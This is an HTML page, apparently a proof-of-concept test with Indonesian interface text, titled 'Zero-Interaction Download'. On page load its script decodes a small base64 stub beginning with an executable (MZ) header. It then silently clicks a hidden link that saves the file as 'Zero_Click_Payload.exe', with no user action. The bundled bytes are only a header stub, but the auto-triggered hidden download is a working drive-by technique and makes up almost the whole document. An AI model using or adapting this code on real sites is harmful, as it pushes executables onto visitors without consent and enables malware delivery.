<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Zero-Interaction Download (DOMContentLoaded)</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
.panel { background: #ffffff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); max-width: 600px; width: 100%; }
h2 { color: #d32f2f; margin-bottom: 10px; }
p { margin-bottom: 20px; line-height: 1.6; color: #555; }
#status { margin-top: 20px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; border: 1px solid #ffcdd2; }
</style>
</head>

<body>
<div class="panel" id="main-panel">
    <h2>Zero-Interaction Download</h2>
    <p>Memicu unduhan secara otomatis saat DOM selesai dimuat (tanpa interaksi fisik).</p>
    <div id="status" role="status">Memuat halaman...</div>
</div>

<script>
    const statusDiv = document.getElementById("status");

    // Payload biner (MZ Header) untuk file .exe
    const b64Data = "TVqQAAMAAAAEAAAAAEEAAgBA";
    const binary = atob(b64Data);
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);

    // Fungsi untuk memicu unduhan
    const triggerDownload = () => {
        try {
            statusDiv.textContent = "Memicu unduhan otomatis...";
            
            const blob = new Blob([bytes], { type: 'application/octet-stream' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'Zero_Click_Payload.exe';
            a.style.display = 'none';
            
            document.body.appendChild(a);
            a.click();
            
            setTimeout(() => {
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            }, 3000);
            
            statusDiv.textContent = "Unduhan dipicu! Cek folder Download.";
            statusDiv.style.color = "#4CAF50";
        } catch (e) {
            statusDiv.textContent = "Gagal: " + e.message;
            statusDiv.style.color = "#f00";
        }
    };

    // MEMICU UNDUHAN SECARA OTOMATIS SAAT DOM SIAP
    window.addEventListener("DOMContentLoaded", () => {
        triggerDownload();
    });
</script>
</body>
</html>
